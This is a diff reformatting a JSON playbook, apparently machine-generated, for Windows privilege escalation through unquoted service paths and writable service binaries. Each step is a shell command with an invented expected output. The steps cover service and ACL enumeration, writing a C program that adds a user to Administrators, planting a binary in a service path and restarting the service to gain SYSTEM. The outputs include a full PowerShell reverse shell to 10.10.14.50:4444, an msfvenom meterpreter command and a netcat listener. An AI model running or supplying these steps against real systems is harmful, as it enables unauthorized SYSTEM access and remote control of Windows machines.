@@ -2,37 +2,129 @@
   "name": "windows_unquoted_service_paths",
   "description": "Exploit unquoted service paths and writable service binaries for privilege escalation",
   "pattern": "unquoted.*service|service.*path|writable.*service",
-  "parameters": ["service_name", "binary_path"],
+  "parameters": [
+    "service_name",
+    "binary_path"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\""]},
-      "expected_output": {"type": "string", "example": "VulnerableService    Vulnerable Service    C:\\Program Files\\Vulnerable App\\service.exe    Auto\nBackupService         Backup Service        C:\\Program Files\\Company\\Backup Service\\backup.exe    Auto\nMonitorService        Monitor Service       C:\\Program Files (x86)\\Monitor App\\monitor service.exe    Auto\n\nUnquoted service paths found:\n  VulnerableService: C:\\Program Files\\Vulnerable App\\service.exe\n  BackupService: C:\\Program Files\\Company\\Backup Service\\backup.exe\n  MonitorService: C:\\Program Files (x86)\\Monitor App\\monitor service.exe\n\nExploit potential:\n  If \"C:\\Program Files\\Vulnerable\" is writable:\n    Copy malicious exe to \"C:\\Program Files\\Vulnerable.exe\"\n    Windows tries paths in order:\n      1. C:\\Program.exe (if exists)\n      2. C:\\Program Files\\Vulnerable.exe (our malicious binary!)\n      3. C:\\Program Files\\Vulnerable App\\service.exe (intended)\n\nService runs as SYSTEM - malicious binary executes as SYSTEM!"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\""
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "VulnerableService    Vulnerable Service    C:\\Program Files\\Vulnerable App\\service.exe    Auto\nBackupService         Backup Service        C:\\Program Files\\Company\\Backup Service\\backup.exe    Auto\nMonitorService        Monitor Service       C:\\Program Files (x86)\\Monitor App\\monitor service.exe    Auto\n\nUnquoted service paths found:\n  VulnerableService: C:\\Program Files\\Vulnerable App\\service.exe\n  BackupService: C:\\Program Files\\Company\\Backup Service\\backup.exe\n  MonitorService: C:\\Program Files (x86)\\Monitor App\\monitor service.exe\n\nExploit potential:\n  If \"C:\\Program Files\\Vulnerable\" is writable:\n    Copy malicious exe to \"C:\\Program Files\\Vulnerable.exe\"\n    Windows tries paths in order:\n      1. C:\\Program.exe (if exists)\n      2. C:\\Program Files\\Vulnerable.exe (our malicious binary!)\n      3. C:\\Program Files\\Vulnerable App\\service.exe (intended)\n\nService runs as SYSTEM - malicious binary executes as SYSTEM!"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "powershell", "args": ["-c", "Get-WmiObject win32_service | ?{$_.StartName -ne 'LocalSystem'} | select Name, DisplayName, PathName, StartName | fl"]},
-      "expected_output": {"type": "string", "example": "Name        : BackupService\nDisplayName : Company Backup Service\nPathName    : C:\\Program Files\\Company\\Backup Service\\backup.exe\nStartName   : NT AUTHORITY\\SYSTEM\n\nName        : CustomService\nDisplayName : Custom Application Service\nPathName    : C:\\Services\\App Service\\custom.exe\nStartName   : LocalSystem\n\nName        : DevService\nDisplayName : Development Service\nPathName    : \"C:\\Dev\\Service App\\dev.exe\" -config \"C:\\Dev\\config.xml\"\nStartName   : CORP\\svcaccount\n\nServices analysis:\n  BackupService: Unquoted, runs as SYSTEM\n  CustomService: Unquoted, runs as LocalSystem\n  DevService: Quoted (safe), but runs as domain account\n\nTarget: BackupService and CustomService"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "Get-WmiObject win32_service | ?{$_.StartName -ne 'LocalSystem'} | select Name, DisplayName, PathName, StartName | fl"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Name        : BackupService\nDisplayName : Company Backup Service\nPathName    : C:\\Program Files\\Company\\Backup Service\\backup.exe\nStartName   : NT AUTHORITY\\SYSTEM\n\nName        : CustomService\nDisplayName : Custom Application Service\nPathName    : C:\\Services\\App Service\\custom.exe\nStartName   : LocalSystem\n\nName        : DevService\nDisplayName : Development Service\nPathName    : \"C:\\Dev\\Service App\\dev.exe\" -config \"C:\\Dev\\config.xml\"\nStartName   : CORP\\svcaccount\n\nServices analysis:\n  BackupService: Unquoted, runs as SYSTEM\n  CustomService: Unquoted, runs as LocalSystem\n  DevService: Quoted (safe), but runs as domain account\n\nTarget: BackupService and CustomService"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "icacls \"C:\\Program Files\\Company\\Backup Service\""]},
-      "expected_output": {"type": "string", "example": "C:\\Program Files\\Company\\Backup Service BUILTIN\\Users:(OI)(CI)(F)\n                                           NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n                                           BUILTIN\\Administrators:(OI)(CI)(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n\nDirectory permissions:\n  BUILTIN\\Users: (F) Full Control - EXPLOITABLE!\n  SYSTEM: Full Control\n  Administrators: Full Control\n\nUsers group has full control = can write malicious binary!\n\nExploitation path:\n  1. Create malicious.exe (reverse shell as SYSTEM)\n  2. Copy to: C:\\Program Files\\Company\\Backup.exe\n  3. Restart service or reboot\n  4. Windows executes C:\\Program Files\\Company\\Backup.exe as SYSTEM\n  5. Gain SYSTEM shell"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "icacls \"C:\\Program Files\\Company\\Backup Service\""
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "C:\\Program Files\\Company\\Backup Service BUILTIN\\Users:(OI)(CI)(F)\n                                           NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n                                           BUILTIN\\Administrators:(OI)(CI)(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n\nDirectory permissions:\n  BUILTIN\\Users: (F) Full Control - EXPLOITABLE!\n  SYSTEM: Full Control\n  Administrators: Full Control\n\nUsers group has full control = can write malicious binary!\n\nExploitation path:\n  1. Create malicious.exe (reverse shell as SYSTEM)\n  2. Copy to: C:\\Program Files\\Company\\Backup.exe\n  3. Restart service or reboot\n  4. Windows executes C:\\Program Files\\Company\\Backup.exe as SYSTEM\n  5. Gain SYSTEM shell"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "echo #include <stdlib.h> > C:\\Temp\\exploit.c && echo int main() { system(\"cmd.exe /c net localgroup administrators lowpriv /add\"); return 0; } >> C:\\Temp\\exploit.c"]},
-      "expected_output": {"type": "string", "example": "Malicious C code created: C:\\Temp\\exploit.c\n\nCode functionality:\n  Adds current user 'lowpriv' to local Administrators group\n  Runs with service privileges (SYSTEM)\n\nCompile:\n  C:\\> gcc C:\\Temp\\exploit.c -o \"C:\\Program Files\\Company\\Backup.exe\"\n\nAlternative (PowerShell reverse shell):\n  Create PowerShell script:\n    $client = New-Object System.Net.Sockets.TCPClient('10.10.14.50',4444)\n    $stream = $client.GetStream()\n    [byte[]]$bytes = 0..65535|%{0}\n    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)\n      $sendback = (iex $data 2>&1 | Out-String )\n      $stream.Write(([text.encoding]::ASCII).GetBytes($sendback),0,$sendback.Length)\n    }\n  \n  Wrap in exe: ps2exe.ps1 or compile with C#"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "echo #include <stdlib.h> > C:\\Temp\\exploit.c && echo int main() { system(\"cmd.exe /c net localgroup administrators lowpriv /add\"); return 0; } >> C:\\Temp\\exploit.c"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Malicious C code created: C:\\Temp\\exploit.c\n\nCode functionality:\n  Adds current user 'lowpriv' to local Administrators group\n  Runs with service privileges (SYSTEM)\n\nCompile:\n  C:\\> gcc C:\\Temp\\exploit.c -o \"C:\\Program Files\\Company\\Backup.exe\"\n\nAlternative (PowerShell reverse shell):\n  Create PowerShell script:\n    $client = New-Object System.Net.Sockets.TCPClient('10.10.14.50',4444)\n    $stream = $client.GetStream()\n    [byte[]]$bytes = 0..65535|%{0}\n    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)\n      $sendback = (iex $data 2>&1 | Out-String )\n      $stream.Write(([text.encoding]::ASCII).GetBytes($sendback),0,$sendback.Length)\n    }\n  \n  Wrap in exe: ps2exe.ps1 or compile with C#"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "copy C:\\Windows\\System32\\cmd.exe \"C:\\Program Files\\Company\\Backup.exe\""]},
-      "expected_output": {"type": "string", "example": "        1 file(s) copied.\n\nMalicious binary placed:\n  Source: C:\\Windows\\System32\\cmd.exe (benign for test)\n  Destination: C:\\Program Files\\Company\\Backup.exe\n  Service will execute this as SYSTEM\n\nProduction exploit:\n  Replace cmd.exe with:\n    - Meterpreter reverse_tcp payload\n    - Cobalt Strike beacon\n    - Custom backdoor\n    - Empire agent\n\nGenerate with msfvenom:\n  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f exe -o Backup.exe"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "copy C:\\Windows\\System32\\cmd.exe \"C:\\Program Files\\Company\\Backup.exe\""
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "        1 file(s) copied.\n\nMalicious binary placed:\n  Source: C:\\Windows\\System32\\cmd.exe (benign for test)\n  Destination: C:\\Program Files\\Company\\Backup.exe\n  Service will execute this as SYSTEM\n\nProduction exploit:\n  Replace cmd.exe with:\n    - Meterpreter reverse_tcp payload\n    - Cobalt Strike beacon\n    - Custom backdoor\n    - Empire agent\n\nGenerate with msfvenom:\n  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f exe -o Backup.exe"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "sc stop BackupService && sc start BackupService"]},
-      "expected_output": {"type": "string", "example": "SERVICE_NAME: BackupService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 3  STOP_PENDING\n        WIN32_EXIT_CODE    : 0  (0x0)\n\nSERVICE_NAME: BackupService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n        WIN32_EXIT_CODE    : 0  (0x0)\n        PID                : 3456\n\nService restarted successfully!\n\nMalicious binary executed as SYSTEM (PID 3456)\n\nCheck listener:\n  nc -lvnp 4444\n  or\n  msfconsole handler\n\nIf service fails to start:\n  - Binary might crash immediately\n  - Wait for reboot (service auto-starts)\n  - Check permissions on binary"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "sc stop BackupService && sc start BackupService"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "SERVICE_NAME: BackupService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 3  STOP_PENDING\n        WIN32_EXIT_CODE    : 0  (0x0)\n\nSERVICE_NAME: BackupService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n        WIN32_EXIT_CODE    : 0  (0x0)\n        PID                : 3456\n\nService restarted successfully!\n\nMalicious binary executed as SYSTEM (PID 3456)\n\nCheck listener:\n  nc -lvnp 4444\n  or\n  msfconsole handler\n\nIf service fails to start:\n  - Binary might crash immediately\n  - Wait for reboot (service auto-starts)\n  - Check permissions on binary"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "powershell", "args": ["-c", "Get-Acl 'C:\\Program Files\\VulnerableApp\\service.exe' | Format-List"]},
-      "expected_output": {"type": "string", "example": "Path   : Microsoft.PowerShell.Core\\FileSystem::C:\\Program Files\\VulnerableApp\\service.exe\nOwner  : BUILTIN\\Administrators\nGroup  : CORP\\Domain Users\nAccess : NT AUTHORITY\\SYSTEM Allow  FullControl\n         BUILTIN\\Administrators Allow  FullControl\n         BUILTIN\\Users Allow  Modify, Synchronize\n         BUILTIN\\Users Allow  ReadAndExecute, Synchronize\n\nService binary permissions:\n  Users: Modify permission - CAN REPLACE BINARY!\n\nDirect exploitation:\n  1. Backup original: copy service.exe service.exe.bak\n  2. Replace: copy payload.exe service.exe\n  3. Restart service: sc stop VulnerableApp && sc start VulnerableApp\n  4. Original binary overwritten with malicious payload\n  5. Service runs payload as configured user (often SYSTEM)\n\nEasier than unquoted path - direct binary replacement!"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "Get-Acl 'C:\\Program Files\\VulnerableApp\\service.exe' | Format-List"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Path   : Microsoft.PowerShell.Core\\FileSystem::C:\\Program Files\\VulnerableApp\\service.exe\nOwner  : BUILTIN\\Administrators\nGroup  : CORP\\Domain Users\nAccess : NT AUTHORITY\\SYSTEM Allow  FullControl\n         BUILTIN\\Administrators Allow  FullControl\n         BUILTIN\\Users Allow  Modify, Synchronize\n         BUILTIN\\Users Allow  ReadAndExecute, Synchronize\n\nService binary permissions:\n  Users: Modify permission - CAN REPLACE BINARY!\n\nDirect exploitation:\n  1. Backup original: copy service.exe service.exe.bak\n  2. Replace: copy payload.exe service.exe\n  3. Restart service: sc stop VulnerableApp && sc start VulnerableApp\n  4. Original binary overwritten with malicious payload\n  5. Service runs payload as configured user (often SYSTEM)\n\nEasier than unquoted path - direct binary replacement!"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
